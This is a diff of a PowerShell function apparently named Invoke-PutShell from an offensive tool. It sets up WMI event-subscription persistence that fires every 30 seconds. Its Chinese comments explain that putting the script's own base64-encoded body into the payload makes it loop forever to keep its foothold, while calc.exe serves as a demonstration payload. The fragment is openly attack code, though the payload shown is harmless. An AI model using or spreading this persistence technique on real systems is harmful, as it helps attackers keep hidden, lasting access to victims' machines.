@@ -380,7 +380,9 @@ function Invoke-PutShell
 		{
 			$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
 			
-			# 命令执行 , 执行self script :)  这样就可以无限驻留
+			# 命令执行
+			# 如果你把"本脚本"处理下进行base64后填在这里，这样就可以一直循环本脚本内容，保证持久性
+			# 为了演示，这里执行了 calc.exe 命令.
 			$EncScript = [Convert]::ToBase64String( [System.Text.Encoding]::Unicode.GetBytes("calc.exe") )
 
 			#clear me
